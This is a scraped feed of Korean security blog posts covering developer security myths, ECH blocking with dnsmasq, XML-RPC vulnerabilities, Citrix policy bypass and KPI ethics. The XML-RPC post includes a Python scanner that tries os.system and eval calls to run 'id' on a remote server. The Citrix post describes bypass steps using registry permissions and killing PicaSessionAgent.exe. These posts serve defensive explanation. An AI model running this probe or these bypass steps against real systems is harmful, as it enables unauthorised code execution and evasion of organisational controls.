오버플로우나 메모리 누수 같은 문제는 예방할 수 있지만, SQL 주입이나 크로스 사이트 스크립팅(XSS) 같은 보안 위협까지 자동으로 해결하지 않습니다. 또한 unsafe 블록을 사용하면 메모리 안전성이 손상될 수 있습니다. Carnegie Mellon University(SEI)의 분석에 따르면, Rust가 모든 보안 문제를 해결하지 못하며, 특히 주입 공격이나 타사 라이브러리 오용 같은 문제는 별도의 보안 설계가 필요합니다 (출처).\n거짓말: \u0026ldquo;최신 프레임워크와 라이브러리를 사용하니 안전합니다.\u0026rdquo;\n현실: 최신 기술이라도 올바른 설정과 정기적인 업데이트가 이루어지지 않으면 보안 취약점이 발생할 수 있습니다. 오픈소스 라이브러리 중 86%가 취약점을 포함하고 있다는 연구 결과가 이를 입증합니다 (출처).\n거짓말: \u0026ldquo;HTTPS를 쓰니 데이터는 안전합니다.\u0026rdquo;\n현실: HTTPS는 데이터 전송 중 암호화를 보장하지만, 서버 측 취약점이나 내부 위협 등 다른 공격을 방어하지 않습니다.\n거짓말: \u0026ldquo;방화벽으로 보호되니 외부 공격에서 안전합니다.\u0026rdquo;\n현실: 방화벽은 잘못 설정될 수 있고, 내부 공격자나 신뢰된 연결을 통한 공격은 방어하지 못합니다.\n📌 3. 보안의 과소평가형 거짓말: \u0026ldquo;우리의 데이터는 민감하지 않으니 보안 걱정은 필요 없습니다.\u0026rdquo;\n현실: 민감하지 않은 데이터라도 공격자가 네트워크 침투의 진입점으로 악용할 수 있습니다.\n거짓말: \u0026ldquo;코드 리뷰만으로 모든 보안 문제를 잡을 수 있습니다.\u0026rdquo;\n현실: 코드 리뷰는 중요하지만, 전문적인 보안 지식 없이는 모든 보안 문제를 발견하기 어렵습니다. 추가적인 자동화된 보안 도구와 전문가의 정기적 검토가 필요합니다.\n거짓말: \u0026ldquo;우리는 이미 테스트를 거쳤으니 안전합니다.\u0026rdquo;\n현실: 일반적인 기능 테스트로는 모든 보안 취약점을 찾을 수 없습니다. 보안 테스트는 별도로 수행되어야 하며, 지속적인 점검과 설계 수준의 리뷰가 필요합니다.\n📌 대표적인 실제 사고 사례 GitHub Actions 공급망 공격 (2025년)\n→ 23,000개 이상의 저장소에서 CI/CD 비밀 정보가 유출될 위험이 발생했습니다 (출처). Log4Shell 취약점 (2021년)\n→ Apache Log4j의 원격 코드 실행 취약점으로 전 세계적으로 큰 보안 문제를 야기했습니다 (출처). 📌 보안을 위한 권장사항 정기적 보안 교육 제공\n최신 OWASP Top 10을 중심으로 한 개발자 보안 교육을 정기적으로 진행합니다 (출처).\n보안 자동화 도구 도입\nSAST(정적 분석), DAST(동적 분석), SBOM(소프트웨어 자재명세서) 같은 도구를 활용하여 지속적으로 보안 문제를 탐지합니다.\n오픈소스 라이브러리 관리 강화\nDependabot, Renovate 등의 도구로 지속적으로 오픈소스 취약점을 관리하고 업데이트합니다.\n태그 고정(pinning) 정책 적용\nGitHub Actions 사용 시 commit-hash 방식을 통해 버전을 고정하여 공급망 공격을 예방합니다.\n이러한 접근을 통해 보다 실질적이고 지속 가능한 보안 문화를 구축할 수 있습니다.\n","permalink":"https://windshock.github.io/ko/post/2025-04-01-common-security-myths-developers-tell-themselves/","summary":"개발자들이 보안에 대해 자주 믿는 \u0026lsquo;책임 전가형\u0026rsquo;, \u0026lsquo;기술 과신형\u0026rsquo;, \u0026lsquo;보안 과소평가형\u0026rsquo; 거짓말을 분석하고, 현실적인 대응 방안을 제시합니다.","title":"개발자들 말하는 보안에 대한 흔한 거짓말"},{"content":"\n배경 최근 들어 Cloudflare(1.1.1.1), Google(8.8.8.8) 등 공개 DNS 서비스가 악성코드의 C2 통신 경로로 악용되는 사례가 늘고 있습니다.\n특히, DoH (DNS over HTTPS), ECH (Encrypted Client Hello)와 같은 프로토콜은 DNS 트래픽 및 SNI 필드를 암호화하여 보안 솔루션이 이를 식별하지 못하게 만듭니다.\n참고: ESNI(Encrypted SNI)는 더 이상 사용되지 않으며, 현재는 ECH가 공식적인 표준입니다. 이 글에서는 ESNI 대신 ECH에 초점을 맞춥니다.\n위협 요소 보안 정책 우회: 사용자가 Cloudflare, Google 등의 DoH 주소를 수동 설정하면 기업 DNS 정책이 무력화됩니다. C2 통신 은폐: ECH는 TLS 연결 시 SNI 필드를 암호화하여 도메인 기반 탐지를 어렵게 만듭니다. 데이터 유출: 암호화된 DNS 경로를 통해 기업 내부 정보가 외부로 전송될 수 있습니다. 핵심 요점: DoH와 ECH는 별개이며, 각각에 맞는 대응 필요 이 글에서 설명하는 dnsmasq 기반 설정은 ECH 차단에 해당합니다. DoH는 차단되지 않습니다. DoH는 DNS 쿼리를 HTTPS로 전송하므로, 네트워크 계층의 방화벽 규칙 또는 IP 차단 등의 별도 조치가 필요합니다. 예: Cloudflare DoH(1.1.1.1:443), Google DoH(8.8.8.8:443) 등 차단 참고: Cisco Umbrella의 DoH 우회 방지 가이드 해결책: 중앙 DNS 서버에서 ECH 제어 사용자 단에서 ECH 설정을 변경해도 다시 활성화될 수 있으므로, 기업 DNS 서버에서 직접 SVCB(65), HTTPS(64) 레코드를 필터링하는 방식이 효과적입니다.\n이를 통해 클라이언트가 ECH 기능을 활용할 수 없도록 제한할 수 있습니다.\n실습: macOS에서 dnsmasq를 이용한 ECH 필터링 구성 다른 운영체제(Windows, Linux 등) 사용자는 별도 설정이 필요하며, dnsmasq는 플랫폼에 따라 설치 방법이 다를 수 있습니다.\n1. dnsmasq 설치 brew install dnsmasq 2. 설정 파일 수정 sudo nano /opt/homebrew/etc/dnsmasq.conf 다음 내용을 추가합니다:\n# 외부 DNS 서버 설정 server=8.8.8.8 # SVCB(65), HTTPS(64) 레코드 필터링 filter-rr=SVCB,HTTPS 3. dnsmasq 실행 sudo dnsmasq --conf-file=/opt/homebrew/etc/dnsmasq.conf 4. 시스템 DNS 서버 변경 networksetup -setdnsservers Wi-Fi 127.0.0.1 Ethernet 인터페이스는 Wi-Fi 대신 Ethernet으로 설정해야 합니다.\nECH 차단 확인 방법 Cloudflare의 https://crypto.cloudflare.com/cdn-cgi/trace 페이지에 접속하면 현재 연결에서 ECH가 활성화되었는지 확인할 수 있습니다.\n예시 화면: sni=encrypted 또는 sni=plaintext으로 표시됩니다. 결론 dnsmasq를 통해 SVCB, HTTPS 레코드를 필터링함으로써 ECH 기능은 효과적으로 차단할 수 있습니다. DoH는 이 방법으로 차단되지 않으며, 별도의 네트워크 계층 보안 설정이 필요합니다. macOS 외 운영체제 사용자는 별도 설정 가이드를 참조하거나 방화벽 정책 기반 대응을 고려해야 합니다. ECH 차단은 보안을 강화하지만, 프라이버시 기능을 제한할 수 있는 트레이드오프도 있습니다. 참고: 마지막으로, 인터넷 검열과 관련된 기술에 더 깊은 관심이 있는 독자를 위해, 글로벌 커뮤니티에서 검열 우회 전략과 최신 연구를 논의하는 net4people/bbs GitHub 이슈 페이지를 참고할 수 있습니다. 이 포럼은 GFW, ECH, DNS 암호화 등 다양한 주제를 다루며, 기술적 통찰과 솔루션을 공유합니다.\u0026quot;\n참고 자료 Cloudflare의 ECH 설명 dnsmasq 공식 문서 National Security Agency - Adopting Encrypted DNS in Enterprise Environments Cisco Umbrella의 DoH 우회 방지 가이드 Broadcom의 다양한 운영체제 기반 DoH 차단 방법 ","permalink":"https://windshock.github.io/ko/post/2025-03-31-dnsmasq-ech-doh-block/","summary":"\u003cp\u003e\u003cimg alt=\"DNSMASQ-block background\" loading=\"lazy\" src=\"/images/post/dnsmasq-ech-doh-block.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"배경\"\u003e배경\u003c/h2\u003e\n\u003cp\u003e최근 들어 Cloudflare(1.1.1.1), Google(8.8.8.8) 등 공개 DNS 서비스가 악성코드의 C2 통신 경로로 악용되는 사례가 늘고 있습니다.\u003cbr\u003e\n특히, DoH (DNS over HTTPS), ECH (Encrypted Client Hello)와 같은 프로토콜은 DNS 트래픽 및 SNI 필드를 암호화하여 보안 솔루션이 이를 식별하지 못하게 만듭니다.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e참고\u003c/strong\u003e: ESNI(Encrypted SNI)는 더 이상 사용되지 않으며, 현재는 \u003cstrong\u003eECH\u003c/strong\u003e가 공식적인 표준입니다. 이 글에서는 ESNI 대신 ECH에 초점을 맞춥니다.\u003c/p\u003e\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"위협-요소\"\u003e위협 요소\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e보안 정책 우회\u003c/strong\u003e: 사용자가 Cloudflare, Google 등의 DoH 주소를 수동 설정하면 기업 DNS 정책이 무력화됩니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eC2 통신 은폐\u003c/strong\u003e: ECH는 TLS 연결 시 SNI 필드를 암호화하여 도메인 기반 탐지를 어렵게 만듭니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e데이터 유출\u003c/strong\u003e: 암호화된 DNS 경로를 통해 기업 내부 정보가 외부로 전송될 수 있습니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"핵심-요점-doh와-ech는-별개이며-각각에-맞는-대응-필요\"\u003e핵심 요점: DoH와 ECH는 별개이며, 각각에 맞는 대응 필요\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e이 글에서 설명하는 \u003cstrong\u003ednsmasq 기반 설정은 ECH 차단\u003c/strong\u003e에 해당합니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDoH는 차단되지 않습니다\u003c/strong\u003e. DoH는 DNS 쿼리를 HTTPS로 전송하므로, \u003cstrong\u003e네트워크 계층의 방화벽 규칙 또는 IP 차단\u003c/strong\u003e 등의 별도 조치가 필요합니다.\n\u003cul\u003e\n\u003cli\u003e예: Cloudflare DoH(1.1.1.1:443), Google DoH(8.8.8.8:443) 등 차단\u003c/li\u003e\n\u003cli\u003e참고: \u003ca href=\"https://support.umbrella.com/hc/en-us/articles/230904088-How-to-Prevent-Users-from-Circumventing-Cisco-Umbrella-with-Firewall-Rules\"\u003eCisco Umbrella의 DoH 우회 방지 가이드\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"해결책-중앙-dns-서버에서-ech-제어\"\u003e해결책: 중앙 DNS 서버에서 ECH 제어\u003c/h2\u003e\n\u003cp\u003e사용자 단에서 ECH 설정을 변경해도 다시 활성화될 수 있으므로, \u003cstrong\u003e기업 DNS 서버에서 직접 SVCB(65), HTTPS(64) 레코드를 필터링\u003c/strong\u003e하는 방식이 효과적입니다.\u003cbr\u003e\n이를 통해 클라이언트가 ECH 기능을 활용할 수 없도록 제한할 수 있습니다.\u003c/p\u003e","title":"기업 네트워크 보안을 위한 ECH 차단 및 DoH 대응 전략"},{"content":" 주요 요약 XML-RPC 취약점 개요: 시스템 간 통신을 위한 경량 원격 호출 프로토콜인 XML-RPC는 명령 주입(RCE), XXE, DDoS, 권한 상승 등 다양한 위협에 노출됩니다. 대표 사례: NodeBB (CVE-2023-43187), Apache OFBiz (CVE-2020-9496), PHP XML-RPC (CVE-2005-1921) 등. 실제 사용처: WordPress, Bugzilla, ManageEngine, Apache OFBiz 외에도 일부 레거시 시스템에서 활용 중입니다. 완화 전략: XML-RPC 비활성화, 입력 검증 강화, 인증 체계 강화, 최신 보안 패치 적용, 접근 제어 및 WAF 도입. XML-RPC란 무엇인가? **XML-RPC (XML Remote Procedure Call)**는 XML을 데이터 포맷으로, HTTP를 전송 수단으로 사용하는 원격 프로시저 호출(RPC) 프로토콜입니다. 1998년 Dave Winer와 Microsoft가 공동 제안했으며, 플랫폼 간 통신을 간편화하기 위해 설계되었습니다.\n기본 원리 클라이언트가 XML 형식으로 요청을 보내면 서버가 XML로 응답을 반환합니다. 표준 HTTP(S)를 활용해 방화벽을 쉽게 통과할 수 있습니다. XML-RPC의 역사 XML-RPC는 초기 웹 서비스에서 널리 쓰였으며, Perl, Java, Python, C, PHP 등 다양한 언어에서 구현되었습니다. 이후 SOAP로 발전했지만, 단순성 때문에 일부 환경에서 지속적으로 활용되었습니다.\nXML-RPC의 현재 RESTful API 및 gRPC 등 최신 기술의 등장으로 사용이 점차 감소하고 있습니다. WordPress도 REST API로 전환 중이며, 레거시 시스템에서만 제한적으로 활용되는 추세입니다.\n취약점 분석 1. XML 주입 및 원격 코드 실행 (RCE) NodeBB (CVE-2023-43187): XML 입력 미검증으로 RCE 가능 Apache OFBiz (CVE-2020-9496): Java 역직렬화 기반 RCE PHP XML-RPC (CVE-2005-1921): eval() 오용을 통한 RCE 가능 2. XXE (XML External Entity) Apache XML-RPC (CVE-2016-5002): 외부 엔티티 비활성화 누락으로 로컬 파일 노출 및 SSRF 가능 3. DDoS 및 Brute Force 공격 system.multicall: 무차별 대입 공격 자동화 pingback.ping: DDoS 중계 공격 수행 4. 인증 우회 및 권한 상승 WordPress (CVE-2020-28036): XML-RPC를 통한 인증 우회 실제 공격 사례 SonicWall 보고서 (2018): XML-RPC 공격 10만 건 이상 감지 WPbrutebot: XML-RPC 기반 Brute-force 공격 Pingback DDoS: XML-RPC를 이용한 대규모 중계 공격 XML-RPC 익스플로잇 예시 아래는 Python 기반으로 동작하는 XML-RPC의 RCE 취약점 탐지 Python 코드와 실행 화면입니다.\nimport xmlrpc.client import ssl import http.client candidate_methods = [ \u0026#34;os.system\u0026#34;, \u0026#34;commands.getoutput\u0026#34;, \u0026#34;subprocess.check_output\u0026#34;, ] candidate_methods_eval = [ \u0026#34;__builtin__.eval\u0026#34;, \u0026#34;builtins.eval\u0026#34;, ] rpc_urls = [ \u0026#34;https://xxx.com/cgi-bin/rpc.cgi\u0026#34;, ] context = ssl._create_unverified_context() class UnverifiedTransport(xmlrpc.client.SafeTransport): def make_connection(self, host): return http.client.HTTPSConnection(host, context=context) for rpc_url in rpc_urls: print(f\u0026#34;[+] Scanning target: {rpc_url}\u0026#34;) client = xmlrpc.client.ServerProxy(rpc_url, transport=UnverifiedTransport()) for method in candidate_methods: try: parts = method.split(\u0026#34;.\u0026#34;) obj = getattr(client, parts[0]) func = getattr(obj, parts[1]) print(f\u0026#34;[\u0026gt;] Trying {method}(\u0026#39;id\u0026#39;)...\u0026#34;) result = func(\u0026#39;id\u0026#39;) if isinstance(result, bytes): result = result.decode() print(f\u0026#34;[✔] {method} → Success! Result: {result}\\n\u0026#34;) except Exception as e: print(f\u0026#34;[-] {method} blocked: {e}\u0026#34;) for method in candidate_methods_eval: try: parts = method.split(\u0026#34;.\u0026#34;) obj = getattr(client, parts[0]) func = getattr(obj, parts[1]) payload = \u0026#39;__import__(\u0026#34;commands\u0026#34;).getoutput(\u0026#34;id\u0026#34;)\u0026#39; print(f\u0026#34;[\u0026gt;] Trying {method}(\u0026#39;{payload}\u0026#39;)...\u0026#34;) result = func(payload) if isinstance(result, bytes): result = result.decode() print(f\u0026#34;[✔] {method} → Success! Result: {result}\\n\u0026#34;) except Exception as e: print(f\u0026#34;[-] {method} blocked: {e}\u0026#34;) ⚠️ 본 스크립트는 반드시 허가된 환경에서만 사용하세요.\nXML-RPC 활용 중인 대표 서비스 시스템 활용 예시 WordPress 게시, 댓글, pingback (REST로 전환 중) Bugzilla 버그 등록 및 수정 API ManageEngine 사용자 계정 및 비밀번호 관리 Apache OFBiz ERP 연동 API 보안 강화 방안 XML-RPC 비활성화 (.htaccess, 웹서버 설정, 플러그인) 입력 검증 강화 (정규식 기반) XXE 방지 설정 적용 API 키, OAuth, JWT 인증 적용 IP 기반 접근 제한 웹 애플리케이션 방화벽(WAF) 도입 로그 모니터링 및 정기적 취약점 점검 수행 현대 대체 기술 비교 항목 XML-RPC REST GraphQL 데이터 형식 XML JSON JSON 구조 메서드 기반 리소스 기반 쿼리 기반 확장성 낮음 높음 매우 높음 보안성 낮음 중간 이상 중간 이상 장점 간단 구현 캐싱 가능 데이터 최소화 결론 및 제언 XML-RPC는 보안 위험이 높아 사용을 자제하세요. 불가피한 경우, 강력한 인증 및 접근 제어를 반드시 적용하세요. REST 또는 GraphQL로의 전환을 적극 권장합니다. 참조 링크 XML-RPC - Wikipedia CVE-2023-43187 - NodeBB XML Injection CVE-2020-9496 - Apache OFBiz RCE CVE-2005-1921 - PHP XMLRPC Code Injection CVE-2016-5002 - Apache XML-RPC XXE WordPress XML-RPC 보안 가이드 (SolidWP) SonicWall XML-RPC 공격 분석 보고서 ","permalink":"https://windshock.github.io/ko/post/2025-03-28-xml-rpc-security-vulnerabilities-analysis-and-mitigation-strategies/","summary":"\u003chr\u003e\n\u003cp\u003e\u003cimg alt=\"xmlrpc 배경화면\" loading=\"lazy\" src=\"/images/post/xmlrpc-security.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"주요-요약\"\u003e주요 요약\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eXML-RPC 취약점 개요:\u003c/strong\u003e 시스템 간 통신을 위한 경량 원격 호출 프로토콜인 XML-RPC는 명령 주입(RCE), XXE, DDoS, 권한 상승 등 다양한 위협에 노출됩니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e대표 사례:\u003c/strong\u003e NodeBB (CVE-2023-43187), Apache OFBiz (CVE-2020-9496), PHP XML-RPC (CVE-2005-1921) 등.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e실제 사용처:\u003c/strong\u003e WordPress, Bugzilla, ManageEngine, Apache OFBiz 외에도 일부 레거시 시스템에서 활용 중입니다.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e완화 전략:\u003c/strong\u003e XML-RPC 비활성화, 입력 검증 강화, 인증 체계 강화, 최신 보안 패치 적용, 접근 제어 및 WAF 도입.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"xml-rpc란-무엇인가\"\u003eXML-RPC란 무엇인가?\u003c/h2\u003e\n\u003cp\u003e**XML-RPC (XML Remote Procedure Call)**는 XML을 데이터 포맷으로, HTTP를 전송 수단으로 사용하는 원격 프로시저 호출(RPC) 프로토콜입니다. 1998년 Dave Winer와 Microsoft가 공동 제안했으며, 플랫폼 간 통신을 간편화하기 위해 설계되었습니다.\u003c/p\u003e","title":"XML-RPC 보안 취약점 분석 및 완화 전략"},{"content":"시트릭스 보안 정책 효과성 검토 1. 서론 시트릭스 관리자들은 Citrix 그룹 정책을 통해 각 사용자의 VDI(가상 데스크탑 인프라)에 보안 정책을 적용합니다. 그러나 Citrix CSE(시트릭스 서비스 엔진)와 Citrix VDI 에이전트 내의 일부 구조적 취약점으로 인해 이러한 보안 정책을 우회할 가능성이 존재합니다.\n2. 보안 정책 우회 레지스트리 조작을 통한 우회 Citrix VDI 에이전트(PicaSvc2.exe)가 정책을 저장하는 과정에서 발생하는 레이스 컨디션을 이용해 레지스트리를 조작함으로써 보안 정책 우회가 가능합니다. 시트릭스는 이 취약점을 완화하기 위해 스텔스 패치를 적용했지만, 레지스트리 보안 설정을 조정하고 쓰기 권한을 거부함으로써 여전히 보안 정책을 비활성화할 수 있습니다.\nCSE의 강제 종료 시트릭스 CSE(시트릭스 서비스 엔진)가 강제로 종료되거나 삭제되면 보안 정책이 적용되지 않아, 제한된 리소스에 대한 무단 접근이 발생할 가능성이 있습니다.\nGPF 파일 조작 GPF(그룹 정책 파일)를 수정하거나 그 권한을 제한하여 보안 정책을 우회하려는 시도도 가능하지만, 이 방법은 불안정하며 여러 한계점이 존재합니다.\n3. 레지스트리 수정 및 쓰기 권한 거부를 통한 우회 사용자가 일반 계정(예: User A)으로 로그인하면, Citrix 보안 정책 설정은 Windows 세션 ID를 기반으로 레지스트리에 생성됩니다. 시트릭스가 보안보다 사용성을 우선시하는 경향으로 인해, 레지스트리 설정(CdmPolicies, IO, VCPolicies)을 수정하고 모든 사용자에 대해 쓰기 권한을 거부함으로써 보안 정책 우회가 가능해집니다. 이로 인해 재접속 시 보안 정책 우회가 이루어집니다.\n테스트 환경에서는 Citrix 보안 정책 레지스트리 설정이 변경되고 권한이 제한되면 자동 로그아웃이 발생합니다. ICA 파일 내의 ClearPassword, Domain, LogonTicket 등의 값을 임의의 값(예: “test”)으로 수정하면, 로컬 계정이 이 자동 로그아웃을 우회할 수 있습니다.\n또한, 로컬 보조 계정으로 로그인하면 강제 로그아웃 제한을 우회할 수 있습니다. 비록 시트릭스가 다중 로그인 세션을 제한하지만, Ctrl-Alt-Del을 눌러 작업 관리자를 실행하고 PicaSessionAgent.exe 프로세스를 종료함으로써 로그인을 완료할 수 있습니다.\n마지막으로, 로컬 계정(예: \u0026ldquo;windshock\u0026rdquo;)으로 로그인하면 Windows 세션 1에서 시트릭스 보안 정책이 우회되어 Citrix VDI를 사용할 수 있습니다.\n4. 결론 시트릭스의 보안 정책 적용 방식은 사용성을 우선시하는 것으로 보이며, 이는 사용자 접근성을 향상시킬 수 있지만 보안 정책 우회를 용이하게 하는 구조적 취약점을 초래합니다. 시트릭스를 사용하는 조직은 이러한 잠재적 보안 우회 가능성을 인식하고, 관리자들이 실시간으로 대응할 수 있도록 추가적인 내부 모니터링 또는 경보 시스템을 구현해야 합니다.\n더 나아가, 시트릭스가 Xen Hypervisor와 같은 하위 시스템 수준에서 보안 정책을 강제한다면, 보안과 사용성 사이의 균형을 유지하면서 우회 시도를 효과적으로 차단할 수 있을 것입니다. 이를 통해 조직은 요구되는 보안 수준과 시트릭스가 제공하는 접근성을 모두 달성할 수 있습니다.\nReferences Citrix Group Policy Troubleshooting for XenApp and XenDesktop 시트릭스 정책 우회는 취약점이 아니라 법률 위반이다 ","permalink":"https://windshock.github.io/ko/post/2024-11-05-review-of-citrix-security-policy-effectiveness/","summary":"\u003ch1 id=\"시트릭스-보안-정책-효과성-검토\"\u003e시트릭스 보안 정책 효과성 검토\u003c/h1\u003e\n\u003ch2 id=\"1-서론\"\u003e1. 서론\u003c/h2\u003e\n\u003cp\u003e시트릭스 관리자들은 Citrix 그룹 정책을 통해 각 사용자의 VDI(가상 데스크탑 인프라)에 보안 정책을 적용합니다. 그러나 Citrix CSE(시트릭스 서비스 엔진)와 Citrix VDI 에이전트 내의 일부 구조적 취약점으로 인해 이러한 보안 정책을 우회할 가능성이 존재합니다.\u003c/p\u003e\n\u003ch2 id=\"2-보안-정책-우회\"\u003e2. 보안 정책 우회\u003c/h2\u003e\n\u003ch3 id=\"레지스트리-조작을-통한-우회\"\u003e레지스트리 조작을 통한 우회\u003c/h3\u003e\n\u003cp\u003eCitrix VDI 에이전트(PicaSvc2.exe)가 정책을 저장하는 과정에서 발생하는 레이스 컨디션을 이용해 레지스트리를 조작함으로써 보안 정책 우회가 가능합니다. 시트릭스는 이 취약점을 완화하기 위해 스텔스 패치를 적용했지만, 레지스트리 보안 설정을 조정하고 쓰기 권한을 거부함으로써 여전히 보안 정책을 비활성화할 수 있습니다.\u003c/p\u003e","title":"시트릭스 보안 정책 효과성 검토"},{"content":"KPI가 사고를 일으킨다!!! - 잘못된 지표는 잘못된 결과를 낳는다. 오래전 메일을 뒤적이다가, 내가 너무 진지하게 보낸 메일에 대한 후배의 답변을 확인했다. 매니저님의 메일을 받고, 깊이 고민하지 않고 지시대로만 일을 수행하고 있음을 깨달았다. 어떤 업무 지시를 받든 해당 업무에 윤리적 이슈가 없는지, 그리고 그대로 수행하는 것이 맞는지 확실히 생각해보고 내 의지대로 진행해야겠다고 다짐했다.\n메일을 자세히 살펴보니, 그 후배는 취약점 현황 시스템을 관리하던 사람이었고, 팀장의 명령으로 고위험 취약점의 위험도를 일괄 낮추도록 조치한 뒤, 내가 윤리적 문제를 제기한 메일에 대해 답변한 것이었다. (오랜 시간이 지난 지금은 상황이 달라졌지만, 당시에는 참 착한 후배였다\u0026hellip;)\n몇 해 전, 임원평가를 앞둔 연말 즈음, 통제가 어려운 취약점 조치 KPI를 높이기 위해 팀장이 KPI 자체를 조작하려 한 적이 있었다. 그 직책자의 비윤리적 행위가 어떤 부작용을 낳았을지 궁금해졌다.\n과거 진단 업무와 사고 이력을 살펴보던 중, KPI가 실제로 보안 사고를 일으킨 사례를 확인하게 되었다. 보안과 관련된 사항이라 구체적인 내용을 밝히긴 어렵지만, “[단독] 해커에게 금융거래 인증문자 착신전환…비트코인 계좌 털려” 등의 뉴스 기사를 통해 간접적으로 접했던 기억이 있다. (착신전환 외에도 다양한 방법이 가능했다.)\n만약 KPI가 없었다면, 실무는 정상적으로 운영되어 사고가 발생하지 않았을 것이다. 그러나 현대 조직 구조에서 KPI는 빼놓을 수 없는 요소이다.\nKPI 구성이 잘못된 것일까? 평가자 입장에서 결과 중심(사고가 없든, 취약점이 없든)으로 지표를 설정할 수밖에 없었을 것이다.\nKPI를 관리하는 절차가 느슨했던 것일까? 아니면 타이트하게 수시로 피드백을 주며 평가에 반영했더라도 문제가 있었던 것일까? 당시 별도의 TF를 구성해 취약점 위험도에 대해 수시로 피드백을 진행했음에도 불구하고 말이다.\n결국, 시간이 지나면서 직책자 평가에 사용되는 KPI는 형식적이라는 사실을 깨달았다. 피터 드러커는 “측정할 수 없는 것은 관리할 수 없다”고 했는데, 사람이 만든 조직에서 기계적인 평가는 처음부터 맞지 않으며, 결국 사람의 욕심에 의해 조작될 수밖에 없다. 과연 우리는 조직을 효과적으로 관리할 수 있을까? 기업은 본질을 우선시할 수 있을까?\nWorks Cited “[단독] \u0026lsquo;해커에게 금융거래 인증문자 착신전환…비트코인 계좌 털려.\u0026rsquo;” 연합뉴스, 2017년 12월 3일, https://www.yna.co.kr/view/MYH20171203004600038. (접근일: 2024년 6월 16일)\n“잘못된 지표는 잘못된 결과를 낳는다.” 중앙일보, 2017년 3월 5일, https://www.joongang.co.kr/article/21337981#home.\n","permalink":"https://windshock.github.io/ko/post/2024-06-20-kpi-causes-accidents/","summary":"\u003ch2 id=\"kpi가-사고를-일으킨다---잘못된-지표는-잘못된-결과를-낳는다\"\u003eKPI가 사고를 일으킨다!!! - 잘못된 지표는 잘못된 결과를 낳는다.\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"KPIs Incidents Toon\" loading=\"lazy\" src=\"/images/post/kpis_incidents.webp\"\u003e\u003c/p\u003e\n\u003cp\u003e오래전 메일을 뒤적이다가, 내가 너무 진지하게 보낸 메일에 대한 후배의 답변을 확인했다. 매니저님의 메일을 받고, 깊이 고민하지 않고 지시대로만 일을 수행하고 있음을 깨달았다. 어떤 업무 지시를 받든 해당 업무에 윤리적 이슈가 없는지, 그리고 그대로 수행하는 것이 맞는지 확실히 생각해보고 내 의지대로 진행해야겠다고 다짐했다.\u003c/p\u003e\n\u003cp\u003e메일을 자세히 살펴보니, 그 후배는 취약점 현황 시스템을 관리하던 사람이었고, 팀장의 명령으로 고위험 취약점의 위험도를 일괄 낮추도록 조치한 뒤, 내가 윤리적 문제를 제기한 메일에 대해 답변한 것이었다. (오랜 시간이 지난 지금은 상황이 달라졌지만, 당시에는 참 착한 후배였다\u0026hellip;)\u003c/p\u003e","title":"KPI가 사고를 일으킨다!!!"},{"content":"보안진단 담당자의 흔한 착각 비효율적인 취약점 평가 구조와 대응 방법 서론 사이버 보안 환경이 끊임없이 변화하면서 보안 취약점 평가는 잠재적인 보안 침해에 대한 주요 방어수단으로 자리잡고 있습니다. 그러나 이에 대한 일반적인 오해로 인해 평가의 실효성이 저하되는 경우가 많습니다. 본 글에서는 보안 취약점 평가에 대한 잘못된 인식을 살펴보고, 이를 극복할 수 있는 효과적인 전략을 제시함으로써 조직의 보안 수준 향상을 지원하고자 합니다.\n보안 취약점 평가에 대한 잘못된 인식 1. 모든 취약점을 반드시 찾아내야 한다는 믿음 보안 취약점 평가 담당자들 사이에는 모든 취약점을 반드시 찾아내야 한다는 생각이 팽배합니다. 이는 인간 평가자의 한계를 이해하지 못한 것입니다. Tyma 등(2019)[1]의 연구에 따르면, 광범위한 노력에도 불구하고 일부 취약점만이 발견되었다고 합니다. 또한 회사의 승인 없이 취약점을 분석한 외부인에 대해 배타적인 자세를 보이는 경우도 있습니다. 이러한 인식의 한계는 평가 담당자들에게 좌절감과 불만을 야기할 수 있습니다.\n2. 보안 점검자의 능력에 대한 과장된 인식 보안 점검 담당자들은 모든 취약점을 반드시 찾아내야 한다고 착각하며, 자신이 발견하지 못한 취약점이 보고되면 화를 내는 경향이 있습니다. 이를 극복하려면 보안 점검자의 능력 한계를 인정하고, 외부 리소스(외부 전문가, 버그바운티 등)[2]를 활용해 취약점을 체계적으로 관리하는 노력이 필요합니다.\n3. 취약점에 대한 상세한 설명으로 문제가 해결될 것이라는 착각 많은 이들은 개발자에게 취약점에 대한 상세한 정보를 제공하면 보안 문제가 완전히 해결될 것이라고 생각합니다. 그러나 OWASP Top 10[3]에서 볼 수 있듯이, 상세한 이해에도 불구하고 기본적인 보안 문제는 지속적으로 발생합니다. 이는 근본적인 구조적 문제로, 취약점 정보만으로는 이를 해결하기 어렵습니다.\n실효성 있는 취약점 평가를 위한 전략 1. 통합적인 보안 설계 접근 개발자의 업무와 이해관계자의 요구사항을 이해하고, 이를 반영하여 구체적인 보안 설계 사양을 수립해야 합니다[2]. 단순히 취약점을 찾는 것이 아닌, 포괄적인 보안 설계 접근이 필요합니다.\n2. 체계적인 취약점 관리 프로세스 마련 취약점 발견 프로세스를 체계화하고, 버그 바운티, 침투 테스트 등 외부 자원을 활용해 취약점 발견 범위를 확대하며, 평가의 일관성과 효율성을 높일 수 있습니다(Shostack, 2014)[4].\n3. 보안 보고 기술 향상 취약점을 실증하지 않고도 효과적으로 보고할 수 있는 기술을 익힘으로써 평가의 효율성과 정확성을 높일 수 있습니다. CVSS(Common Vulnerability Scoring System) 등의 표준화된 도구를 활용하는 것도 도움이 